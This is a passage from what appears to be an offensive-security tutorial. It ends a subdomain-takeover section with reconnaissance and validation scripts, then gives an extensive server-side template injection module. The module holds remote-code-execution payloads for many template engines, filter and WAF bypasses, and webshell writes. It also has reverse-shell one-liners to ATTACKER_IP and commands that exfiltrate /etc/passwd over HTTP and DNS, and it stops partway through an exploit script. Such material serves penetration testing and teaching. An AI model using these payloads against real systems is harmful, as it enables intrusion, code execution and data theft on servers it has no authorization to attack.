def create_dns_record(subdomain, record_type, value):
    # Use DNS provider API
    pass

def delete_dns_record(subdomain, record_type):
    # Use DNS provider API
    pass

def trigger_verification(subdomain):
    # Call service verification endpoint
    pass
```

### Tools for Verification Testing

**Manual Verification Testing:**

```bash
# 1. Monitor HTTP requests during verification
burpsuite # Intercept verification callbacks

# 2. Test verification endpoints directly
curl -X POST https://service.com/api/verify \
  -H "Content-Type: application/json" \
  -d '{"domain":"test.com","method":"dns"}'

# 3. Enumerate verification methods
ffuf -u https://service.com/api/verify/FUZZ \
  -w verification-methods.txt \
  -mc 200,201
```

**Verification Method Wordlist:**

```
dns
http
https
email
txt
cname
file
meta
ssl
certificate
acme
oauth
sso
webhook
```

### Bypassing Geographic Restrictions

**Region-Specific Verification:**

Some services only allow verification from specific geographic regions:

```bash
# Use proxy/VPN in allowed region
proxychains4 curl https://service.com/verify?domain=subdomain.com

# Configure proxychains
cat >> /etc/proxychains4.conf << EOF
[ProxyList]
socks5 allowed-region-proxy.com 1080
EOF
```

### API-Based Verification Exploitation

**Unauthenticated API Endpoints:**

```bash
# Test verification APIs without authentication
curl -X POST https://api.service.com/v1/domains/verify \
  -H "Content-Type: application/json" \
  -d '{
    "domain": "subdomain.victim.com",
    "verification_method": "dns",
    "verification_token": "attacker-controlled-token"
  }'

# Some APIs may accept arbitrary tokens if validation is weak
```

### Defense Evasion During Verification

**Fingerprint Spoofing:**

```python
#!/usr/bin/env python3
import requests

def spoof_verification_request(subdomain):
    """
    Mimic legitimate verification bot behavior
    """
    
    # User-Agent spoofing
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; ServiceBot/1.0; +https://service.com/bot)',
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    # Request from expected IP range if possible
    proxies = {
        'http': 'http://service-ip-range-proxy:8080',
        'https': 'http://service-ip-range-proxy:8080'
    }
    
    response = requests.get(
        f"https://{subdomain}/.well-known/verification.txt",
        headers=headers,
        proxies=proxies
    )
    
    return response.text
```

---

## Complete Subdomain Takeover Workflow

### Reconnaissance Phase

```bash
#!/bin/bash
# Complete subdomain takeover reconnaissance script

TARGET_DOMAIN=$1
OUTPUT_DIR="takeover_results_${TARGET_DOMAIN}"
mkdir -p "$OUTPUT_DIR"

echo "[*] Phase 1: Subdomain Enumeration"
subfinder -d "$TARGET_DOMAIN" -o "$OUTPUT_DIR/subdomains.txt"
amass enum -passive -d "$TARGET_DOMAIN" >> "$OUTPUT_DIR/subdomains.txt"
assetfinder --subs-only "$TARGET_DOMAIN" >> "$OUTPUT_DIR/subdomains.txt"

# Deduplicate
sort -u "$OUTPUT_DIR/subdomains.txt" -o "$OUTPUT_DIR/subdomains_unique.txt"

echo "[*] Phase 2: DNS Resolution"
while read subdomain; do
    # Get all DNS records
    dig "$subdomain" ANY +short >> "$OUTPUT_DIR/dns_records.txt"
    
    # Specifically check for CNAME
    cname=$(dig "$subdomain" CNAME +short)
    if [ -n "$cname" ]; then
        echo "$subdomain → $cname" >> "$OUTPUT_DIR/cname_records.txt"
    fi
done < "$OUTPUT_DIR/subdomains_unique.txt"

echo "[*] Phase 3: Takeover Detection"
subjack -w "$OUTPUT_DIR/subdomains_unique.txt" \
  -t 50 \
  -timeout 30 \
  -ssl \
  -o "$OUTPUT_DIR/vulnerable_subdomains.txt"

echo "[*] Phase 4: Service Fingerprinting"
while read subdomain; do
    echo "Checking $subdomain"
    curl -sI "https://$subdomain" | head -5 >> "$OUTPUT_DIR/http_headers.txt"
done < "$OUTPUT_DIR/vulnerable_subdomains.txt"

echo "[*] Results saved to $OUTPUT_DIR/"
echo "[*] Vulnerable subdomains:"
cat "$OUTPUT_DIR/vulnerable_subdomains.txt"
```

### Validation Phase

```python
#!/usr/bin/env python3
"""
Complete validation script for potential subdomain takeovers
"""

import dns.resolver
import requests
import json
from typing import Dict, List, Optional

class SubdomainTakeoverValidator:
    
    FINGERPRINTS = {
        'github': {
            'cname_pattern': 'github.io',
            'error_signatures': [
                'There isn\'t a GitHub Pages site here',
                'For root URLs (like http://example.com/) you must provide an index.html file'
            ],
            'http_status': [404]
        },
        'heroku': {
            'cname_pattern': 'herokuapp.com',
            'error_signatures': [
                'No such app',
                'herokucdn.com/error-pages/no-such-app.html'
            ],
            'http_status': [404]
        },
        's3': {
            'cname_pattern': 's3.amazonaws.com',
            'error_signatures': [
                'NoSuchBucket',
                'The specified bucket does not exist'
            ],
            'http_status': [404]
        },
        'azure': {
            'cname_pattern': 'azurewebsites.net',
            'error_signatures': [
                '404 Web Site not found',
                'Error 404 - Web app not found'
            ],
            'http_status': [404]
        }
    }
    
    def __init__(self, subdomain: str):
        self.subdomain = subdomain
        self.results = {}
        
    def check_dns(self) -> Optional[str]:
        """Check DNS CNAME record"""
        try:
            answers = dns.resolver.resolve(self.subdomain, 'CNAME')
            cname = str(answers[0].target).rstrip('.')
            self.results['cname'] = cname
            return cname
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            self.results['cname'] = None
            return None
            
    def check_http_response(self) -> Dict:
        """Check HTTP response"""
        try:
            response = requests.get(
                f"https://{self.subdomain}",
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            
            self.results['http_status'] = response.status_code
            self.results['http_body'] = response.text
            self.results['http_headers'] = dict(response.headers)
            
            return self.results
            
        except requests.exceptions.RequestException as e:
            self.results['http_error'] = str(e)
            return self.results
            
    def identify_service(self) -> Optional[str]:
        """Identify target service based on CNAME"""
        cname = self.results.get('cname', '')
        
        for service, fingerprint in self.FINGERPRINTS.items():
            if fingerprint['cname_pattern'] in cname:
                return service
        return None
        
    def check_vulnerability(self) -> bool:
        """Determine if subdomain is vulnerable"""
        service = self.identify_service()
        
        if not service:
            return False
            
        fingerprint = self.FINGERPRINTS[service]
        http_status = self.results.get('http_status')
        http_body = self.results.get('http_body', '')
        
        # Check status code
        if http_status in fingerprint['http_status']:
            # Check error signatures
            for signature in fingerprint['error_signatures']:
                if signature in http_body:
                    self.results['vulnerable'] = True
                    self.results['service'] = service
                    return True
                    
        return False
        
    def generate_report(self) -> Dict:
        """Generate detailed vulnerability report"""
        self.check_dns()
        self.check_http_response()
        
        is_vulnerable = self.check_vulnerability()
        
        report = {
            'subdomain': self.subdomain,
            'vulnerable': is_vulnerable,
            'service': self.results.get('service'),
            'cname': self.results.get('cname'),
            'http_status': self.results.get('http_status'),
            'evidence': []
        }
        
        if is_vulnerable:
            report['evidence'] = [
                f"CNAME points to: {self.results.get('cname')}",
                f"HTTP Status: {self.results.get('http_status')}",
                f"Service: {self.results.get('service')}"
            ]
            
        return report

# Usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <subdomain>")
        sys.exit(1)
        
    validator = SubdomainTakeoverValidator(sys.argv[1])
    report = validator.generate_report()
    
    print(json.dumps(report, indent=2))
```

### Exploitation Phase Safety

**Proof-of-Concept Guidelines:**

```html
<!-- Safe PoC content for subdomain takeover demonstration -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subdomain Takeover - Security Research</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f0f0f0;
        }
        .warning {
            background-color: #fff3cd;
            border: 2px solid #ffc107;
            padding: 20px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ Security Research Notice</h1>
        <p><strong>Subdomain Takeover Vulnerability Identified</strong></p>
        <p>This subdomain was vulnerable to takeover due to misconfigured DNS records.</p>
        <ul>
            <li>Subdomain: <code id="subdomain"></code></li>
            <li>Discovered: <code id="date"></code></li>
            <li>Researcher: <code id="researcher"></code></li>
        </ul>
        <p><strong>Impact:</strong> Attackers could have hosted malicious content, conducted phishing attacks, or stolen sensitive data.</p>
        <p><strong>Recommendation:</strong> Remove or properly configure the DNS CNAME record for this subdomain.</p>
        <p>For more information, contact: <code id="contact"></code></p>
    </div>
    <script>
        document.getElementById('subdomain').textContent = window.location.hostname;
        document.getElementById('date').textContent = new Date().toISOString().split('T')[0];
        document.getElementById('researcher').textContent = '[Your Name/Handle]';
        document.getElementById('contact').textContent = '[Your Contact]';
    </script>
</body>
</html>
```

This module covers comprehensive subdomain takeover techniques including dangling DNS detection, CNAME misconfiguration exploitation, service-specific takeovers across multiple platforms, domain expiration monitoring, and verification bypass methods for responsible security research.

---

# Server-Side Template Injection (SSTI)

## SSTI Fundamentals

Server-Side Template Injection occurs when user input is embedded into template engines without proper sanitization, allowing attackers to inject template directives that execute on the server. Template engines process these directives server-side to generate dynamic content, making SSTI vulnerabilities particularly dangerous as they often lead to Remote Code Execution (RCE).

**Common Vulnerable Code Pattern:**

```python
# Vulnerable Flask/Jinja2 example
from flask import Flask, request, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name')
    template = f'<h1>Hello {name}!</h1>'  # User input directly in template
    return render_template_string(template)  # SSTI vulnerability
```

**Attack Flow:**

1. Identify template engine in use
2. Test for SSTI vulnerability
3. Exploit template syntax for information disclosure
4. Escalate to code execution
5. Achieve system compromise

## Template Engine Identification

### Initial Detection Payload

**Polyglot Detection String:**

```
${7*7}
{{7*7}}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

Test this string in various input fields (URL parameters, form inputs, headers, cookies). Different template engines will evaluate mathematical expressions differently:

- Output `49` → Template injection confirmed
- Output unchanged → No injection or output encoding
- Error message → Potential injection, error reveals engine

**Fuzzing Template Syntax:**

```bash
# Using ffuf to test SSTI in URL parameter
ffuf -w ssti-payloads.txt -u "https://target.com/page?name=FUZZ" -mc all -fw 100

# Example ssti-payloads.txt content:
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
${7*'7'}
```

### Engine-Specific Identification

**Decision Tree Methodology:**

```
Step 1: Test {{7*7}}
  → Output "49" → Likely: Jinja2, Twig, Freemarker, Velocity
  → Output "7777777" → Likely: Smarty
  → Error/Nothing → Try other syntax

Step 2: Test {{7*'7'}}
  → Output "49" → Likely: Jinja2, Twig
  → Output "7777777" → Likely: Jinja2, Twig, Freemarker
  → Error → Likely: Velocity, ERB, Mako

Step 3: Engine-specific confirmation payloads
```

**Identification Payloads by Engine:**

```python
# Jinja2 (Python - Flask, Django)
{{config}}
{{self}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP - Symfony)
{{_self}}
{{_self.env}}
{{dump(app)}}

# Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>
${.now}

# Velocity (Java)
#set($x=7*7)$x
$class.inspect("java.lang.Runtime")

# Smarty (PHP)
{$smarty.version}
{php}echo `id`;{/php}

# Tornado (Python)
{{handler.settings}}

# ERB (Ruby - Rails)
<%= 7*7 %>
<%= system('id') %>

# Mako (Python)
${7*7}
<%import os%>${os.system('id')}

# Pug/Jade (Node.js)
#{7*7}
#{root.process.mainModule.require('child_process').exec('id')}

# Handlebars (Node.js)
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}
```

**Automated Identification Tools:**

```bash
# tplmap - Automatic SSTI scanner
git clone https://github.com/epinna/tplmap.git
cd tplmap
python tplmap.py -u "http://target.com/page?name=test"

# SSTImap - Enhanced SSTI exploitation
git clone https://github.com/vladko312/SSTImap
cd SSTImap
python sstimap.py -u "http://target.com/page?name=test"

# Manual testing with Burp Suite Intruder
# Position: name=§PAYLOAD§
# Payload list: template-engine-detection.txt
```

**Browser-Based Detection Script:**

```javascript
// JavaScript to test SSTI in real-time
function testSST(url, param) {
    const payloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '*{7*7}'
    ];
    
    payloads.forEach(payload => {
        fetch(`${url}?${param}=${encodeURIComponent(payload)}`)
            .then(r => r.text())
            .then(body => {
                if (body.includes('49')) {
                    console.log(`[+] SSTI confirmed with payload: ${payload}`);
                } else if (body.includes('7777777')) {
                    console.log(`[+] SSTI confirmed (Smarty) with payload: ${payload}`);
                }
            });
    });
}

// Usage: testSST('http://target.com/page', 'name')
```

## Expression Language Injection

### Jinja2 (Python) Exploitation

**Information Disclosure:**

```python
# Access configuration
{{config}}
{{config.items()}}

# Access environment
{{self}}
{{self.__dict__}}

# List all classes
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Read files
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Access request object
{{request}}
{{request.environ}}
{{request.application.__self__._get_data_for_json}}
```

**Finding Useful Classes:**

```python
# Enumerate subclasses to find useful ones
{{''.__class__.__mro__[1].__subclasses__()}}

# Search for specific classes
{% for c in [].__class__.__base__.__subclasses__() %}
{% if "warning" in c.__name__ %}
{{c()._module.__builtins__}}
{% endif %}
{% endfor %}

# Find file class index
{{''.__class__.__mro__[1].__subclasses__()[40]}}  # Usually file or _io.TextIOWrapper

# Common useful class indices (may vary):
# subprocess.Popen: index ~250-280
# os._wrap_close: index ~130-140
# warnings.catch_warnings: index ~60-80
```

**Script to Find Useful Classes:**

```python
#!/usr/bin/env python3
# jinja2_class_finder.py

# Find useful classes in Jinja2
for i, cls in enumerate([].__class__.__base__.__subclasses__()):
    if 'warning' in cls.__name__.lower() or \
       'popen' in cls.__name__.lower() or \
       'file' in cls.__name__.lower() or \
       'subprocess' in cls.__name__.lower():
        print(f"[{i}] {cls.__name__}: {cls}")
```

**Code Execution Payloads:**

```python
# Method 1: Via subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# Method 2: Via os module
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Method 3: Via builtins
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}

# Method 4: Using lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# Method 5: Using cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Method 6: Using joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Method 7: Via request object
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Bypassing Filters and Blacklists:**

```python
# Blacklist bypass: attribute access
# Instead of {{config.items()}}
{{config['items']()}}
{{config|attr('items')()}}
{{config|attr('ite'+'ms')()}}

# String concatenation
{{'__cla'+'ss__'}}
{{request['__cl'+'ass__']}}

# Using filters
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Hex encoding
{{request|attr('\x5f\x5fclass\x5f\x5f')}}

# Unicode escape
{{request|attr('\u005f\u005fclass\u005f\u005f')}}

# Base64 encoding (if base64 filter available)
{{'X19jbGFzc19f'|base64decode}}

# Using ~  (tilde) for string concatenation
{{'__cla' ~ 'ss__'}}

# Bypassing dot notation
{{request['__class__']['__mro__'][1]['__subclasses__']()}}

# Filter bypass using \x00
{{request.__class_\x00_}}
```

**Jinja2 Sandbox Escape:**

```python
# Escape sandboxed environment
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").system("id")')}}

# Access prohibited attributes
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()}}

# Using lipsum.globals (often not blocked)
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}
```

### Twig (PHP) Exploitation

**Information Disclosure:**

```php
# Access environment
{{_self}}
{{_self.env}}

# Dump all variables
{{dump()}}
{{dump(app)}}
{{dump(_context)}}

# Get registered functions
{{_self.env.getExtensions()}}

# Access globals
{{app.request.server.all|join(',')}}
```

**Code Execution Payloads:**

```php
# Method 1: Using getFilter
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Method 2: Using map filter
{{["id"]|map("system")|join}}
{{{"<?php system($_GET['cmd']);?>"}|map("system")|join}}

# Method 3: File read
{{'/etc/passwd'|file_excerpt(1,30)}}

# Method 4: Using setCache (pre Twig 3)
{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}

# Method 5: Filter chain
{{["id",0]|sort("system")|join}}
{{["id"]|filter("system")|join}}

# Method 6: Using source function
{{source('/etc/passwd')}}
```

**Bypassing Sandbox (Twig <3.0):**

```php
# Object injection
{{_self.env.enableDebug()}}
{{_self.env.setCache("/tmp")}}

# Custom filter registration
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Reflection-based escape
{{'Twig_Extension_Core::getRandomBytes'|constant}}
```

### Freemarker (Java) Exploitation

**Information Disclosure:**

```java
# Display built-ins
${.now}
${.version}

# Expose Java objects
${"freemarker.template.ObjectWrapper"?new()}

# Access class information
${class}
${class.classLoader}
```

**Code Execution Payloads:**

```java
# Method 1: Execute class instantiation
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# Method 2: ObjectConstructor
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder","id").start()}

# Method 3: JythonRuntime
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("freemarker.template.utility.Execute")>
<#assign obj=clazz.newInstance()>
${obj.exec("id")}

# Method 4: Using BuiltinVariable
<#assign cls="freemarker.template.utility.ObjectConstructor"?new()>
${cls("java.lang.Runtime").getRuntime().exec("id")}
```

### Velocity (Java) Exploitation

**Information Disclosure:**

```java
# Access class information
$class.inspect("java.lang.Runtime")
$class.type

# Enumerate available objects
#foreach($item in $context.keys)
  $item
#end
```

**Code Execution Payloads:**

```java
# Method 1: ClassLoader
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$chr.toString($out.read())
#end

# Method 2: Direct Runtime execution
#set($rt=$class.forName('java.lang.Runtime'))
#set($mt=$rt.getMethod('getRuntime'))
#set($obj=$mt.invoke(null))
#set($ex=$obj.exec('id'))

# Method 3: ProcessBuilder
#set($pb='java.lang.ProcessBuilder')
#set($obj=$class.forName($pb).getDeclaredConstructors()[0])
#set($arr={"bash","-c","id"})
#set($process=$obj.newInstance($arr).start())
```

### Smarty (PHP) Exploitation

**Code Execution Payloads:**

```php
# Method 1: PHP execution (Smarty <3)
{php}echo `id`;{/php}

# Method 2: Using self object
{self::getStreamVariable("file:///etc/passwd")}

# Method 3: Static method call
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}

# Method 4: Function execution
{system('id')}
{passthru('id')}
{exec('id')}

# Method 5: Using math function
{math equation="exec('id')"}

# Method 6: File write
{capture assign="data"}<?php system($_GET['cmd']);?>{/capture}
{file_put_contents('shell.php',$data)}
```

### ERB (Ruby) Exploitation

**Code Execution Payloads:**

```ruby
# Method 1: System execution
<%= system('id') %>
<%= `id` %>

# Method 2: IO.popen
<%= IO.popen('id').readlines() %>

# Method 3: Exec
<%= exec('id') %>

# Method 4: Open3
<%= require 'open3' %>
<%= Open3.capture2('id') %>

# Method 5: Kernel
<%= Kernel.system('id') %>

# Method 6: File read
<%= File.open('/etc/passwd').read %>
```

### Mako (Python) Exploitation

**Code Execution Payloads:**

```python
# Method 1: Import os
<%import os%>
${os.system('id')}

# Method 2: Subprocess
<%
import subprocess
result = subprocess.check_output('id', shell=True)
%>
${result}

# Method 3: Using modules
${__import__('os').popen('id').read()}

# Method 4: File read
${open('/etc/passwd').read()}

# Method 5: Using context
<%
from mako import runtime
%>
${runtime.captures}
```

### Pug/Jade (Node.js) Exploitation

**Code Execution Payloads:**

```javascript
# Method 1: Unescaped output
#{7*7}
!{7*7}

# Method 2: Code execution
- var x = require('child_process')
= x.execSync('id').toString()

# Method 3: Using process
#{process.mainModule.require('child_process').execSync('id')}

# Method 4: Global scope
#{global.process.mainModule.constructor._load('child_process').execSync('id')}

# Method 5: Function constructor
#{function(){return global.process.mainModule.constructor._load('child_process').execSync('id')}()}
```

### Handlebars (Node.js) Exploitation

**Code Execution Payloads:**

```javascript
# Method 1: Prototype pollution to RCE
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# Method 2: Using lookup helper
{{#with "constructor"}}
  {{#with split as |arr|}}
    {{pop (push arr (lookup (lookup (lookup this "sub") "constructor") "name"))}}
    {{#with (pop arr)}}
      {{#with (split "return ")}}
        {{pop (push this "process.mainModule.require('child_process').execSync('id')")}}
        {{#with (join this)}}
          {{#with (concat (lookup this "constructor") "}}")}}
            {{this}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Code Execution via Templates

### Comprehensive Exploitation Workflow

**Step 1: Identify Injection Point**

```bash
# Test all input vectors
- URL parameters: ?page=test
- POST data: name=test
- Headers: User-Agent, Referer, X-Forwarded-For
- Cookies: session=test
- File uploads: filename parameter
- JSON/XML payloads: {"template": "test"}
```

**Step 2: Fingerprint Template Engine**

```python
#!/usr/bin/env python3
# ssti_fingerprint.py
import requests

def fingerprint(url, param):
    payloads = {
        '{{7*7}}': 'Jinja2/Twig/Freemarker',
        '${7*7}': 'Freemarker/Velocity/Mako',
        '<%= 7*7 %>': 'ERB',
        '#{7*7}': 'Jade/Pug',
        '{$smarty.version}': 'Smarty',
        '{{7*\'7\'}}': 'Jinja2/Twig'
    }
    
    results = {}
    
    for payload, engine in payloads.items():
        response = requests.get(f"{url}?{param}={payload}")
        
        if '49' in response.text:
            results[engine] = 'CONFIRMED'
        elif '7777777' in response.text:
            results['Smarty'] = 'CONFIRMED'
        elif 'error' in response.text.lower():
            results[engine] = 'POSSIBLE'
    
    return results

# Usage
results = fingerprint('http://target.com/page', 'name')
for engine, status in results.items():
    print(f"[{status}] {engine}")
```

**Step 3: Escalate to RCE**

**Jinja2 RCE Chain:**

```python
# Complete exploitation chain
# 1. Test basic injection
{{7*7}}

# 2. Confirm MRO access
{{''.__class__.__mro__}}

# 3. List subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# 4. Find subprocess.Popen or warnings.catch_warnings
# Use the class finder script to identify correct index

# 5. Execute command
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}

# 6. Reverse shell
{{''.__class__.__mro__[1].__subclasses__()[396]('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',shell=True,stdout=-1).communicate()}}
```

**Twig RCE Chain:**

```php
# 1. Test injection
{{7*7}}

# 2. Register filter callback
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# 3. Execute arbitrary command
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

# 4. Reverse shell
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")}}
```

**Freemarker RCE Chain:**

```java
# 1. Test injection
${7*7}

# 2. Instantiate Execute class
<#assign ex="freemarker.template.utility.Execute"?new()>

# 3. Execute command
${ex("id")}

# 4. Read file
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>
${ex("java.io.File","/etc/passwd").text}

# 5. Reverse shell
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")}
```

### Advanced Exploitation Techniques

**Blind SSTI Detection:**

```python
#!/usr/bin/env python3
# blind_ssti.py
import requests
import time

def test_blind_ssti(url, param):
    """Test for blind SSTI using time delays"""
    
    # Time-based payloads
    payloads = {
        'jinja2': "{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True).communicate()}}",
        'twig': "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('sleep 5')}}",
        'freemarker': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}',
        'velocity': '#set($ex=$class.forName("java.lang.Thread"))$ex.sleep(5000)',
        'erb': '<%= sleep 5 %>'
    }
    
    for engine, payload in payloads.items():
        start = time.time()
        requests.get(f"{url}?{param}={payload}", timeout=10)
        elapsed = time.time() - start
        
        if elapsed >= 5:
            print(f"[+] Blind SSTI confirmed: {engine} (delay: {elapsed:.2f}s)")
            return engine
    
    print("[-] No blind SSTI detected")
    return None

# Out-of-band detection
def test_oob_ssti(url, param, collaborator):
    """Test SSTI using DNS/HTTP callbacks"""
    
    payloads = {
        'jinja2': f"{{{{''.__class__.__mro__[1].__subclasses__()[396]('nslookup {collaborator}',shell=True).communicate()}}}}",
        'twig': f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('nslookup {collaborator}')}}}}",
        'freemarker': f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("nslookup {collaborator}")}}'
    }
    
    for engine, payload in payloads.items():
        requests.get(f"{url}?{param}={payload}")
        print(f"[*] Sent {engine} payload. Check {collaborator} for callback.")
```

**Data Exfiltration:**

```python
# Jinja2 file exfiltration via DNS
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd | base64 | xargs -I {} nslookup {}.COLLABORATOR.com',shell=True).communicate()}}

# Twig file exfiltration via HTTP
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("curl -d @/etc/passwd http://ATTACKER_IP:8000")}}

# Chunk-based exfiltration for large files
{{''.__class__.__mro__[1].__subclasses__()[396]('split -b 50 /etc/passwd /tmp/chunk_ && for f in /tmp/chunk_*; do curl http://ATTACKER_IP:8000/$(basename $f) -d @$f; done',shell=True).communicate()}}
```

### WAF and Filter Bypass Techniques

**Character Encoding Bypasses:**

```python
# URL encoding
%7B%7B7*7%7D%7D

# Double URL encoding
%257B%257B7*7%257D%257D

# Unicode escape
\u007b\u007b7*7\u007d\u007d

# HTML entities
&#123;&#123;7*7&#125;&#125;

# Hex encoding in attributes
{{'__cla'+'ss__'}}  →  {{'\x5f\x5fclass\x5f\x5f'}}

# Octal encoding
{{"\137\137class\137\137"}}
```

**Whitespace and Comment Bypasses:**

```python
# Jinja2 comments
{{7{# comment #}*7}}

# Concatenation without spaces
{{'__cla'+'ss__'}}
{{request['__class__']}}

# Using filters instead of dots
{{request|attr('application')}}

# Newline injection
{{7*
7}}
```

**Attribute Access Bypasses:**

```python
# Dictionary access instead of dot notation
{{request.__class__}}  →  {{request['__class__']}}
{{request.__class__}}  →  {{request|attr('__class__')}}

# String building
{{request['__cla'+'ss__']}}
{{request|attr('__cla'~'ss__')}}
{{request|attr('\x5f\x5fclass\x5f\x5f')}}

# Using getattr
{{get_flashed_messages.__globals__.__builtins__.getattr(request,'application')}}
```

**Function Call Bypasses:**

```python
# Using filter syntax
{{''.__class__.__mro__[1]}}  →  {{''|attr('__class__')|attr('__mro__')|first}}

# Using select filter
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__}}{%endif%}{%endfor%}

# Using request object methods
{{request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Automated Exploitation Tools

**tplmap Usage:**

```bash
# Basic scan
python tplmap.py -u "http://target.com/page?name=test"

# POST request
python tplmap.py -u "http://target.com/page" -d "name=test"

# With cookies
python tplmap.py -u "http://target.com/page?name=test" -c "session=abc123"

# Specify engine
python tplmap.py -u "http://target.com/page?name=test" --engine Jinja2

# OS shell
python tplmap.py -u "http://target.com/page?name=test" --os-shell

# File read
python tplmap.py -u "http://target.com/page?name=test" --file-read /etc/passwd

# File upload
python tplmap.py -u "http://target.com/page?name=test" --file-upload local.txt remote.txt
```

**SSTImap Usage:**

```bash
# Basic scan with interactive mode
python sstimap.py -u "http://target.com/page?name=test" -i

# Specify parameter
python sstimap.py -u "http://target.com/page" -p name

# Load request from file
python sstimap.py -r request.txt

# Custom payload
python sstimap.py -u "http://target.com/page?name=test" --technique T --eval-code "7*7"

# Reverse shell
python sstimap.py -u "http://target.com/page?name=test" --os-shell --lhost ATTACKER_IP --lport 4444
```

**Custom Exploitation Script:**

```python
#!/usr/bin/env python3
# ssti_exploit.py
import requests
import base64
import sys

class SSTIExploit:
    def __init__(self, url, param, engine='jinja2'):
        self.url = url
        self.param = param
        self.engine = engine
        self.session = requests.Session()
    
    def test_injection(self):
        """Test for SSTI vulnerability"""
        payload = "{{7*7}}"
        response = self.session.get(f"{self.url}?{self.param}={payload}")
        
        if '49' in response.text:
            print("[+] SSTI confirmed!")
            return True
        else:
            print("[-] No SSTI detected")
            return False
    
    def execute_command(self, cmd):
        """Execute system command"""
        
        if self.engine == 'jinja2':
            # Using subprocess.Popen
            payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[396]('{cmd}',shell=True,stdout=-1).communicate()[0].strip()}}}}"
        
        elif self.engine == 'twig':
            payload = f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('{cmd}')}}}}"
        
        elif self.engine == 'freemarker':
